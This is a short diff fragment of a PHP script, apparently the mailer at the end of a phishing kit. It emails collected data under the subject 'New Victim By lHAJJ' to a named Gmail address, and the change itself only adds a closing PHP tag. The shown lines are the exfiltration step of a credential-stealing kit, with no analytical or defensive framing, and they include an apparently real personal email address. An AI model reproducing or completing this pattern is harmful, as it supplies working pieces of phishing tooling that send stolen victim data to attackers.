@@ -13,3 +13,4 @@ $send = "laouziazzedine@gmail.com ";
 $subject = "New Victim By lHAJJ ";
 $headers = "pedro";  
 mail($send,$subject,$message,$headers);
+?>
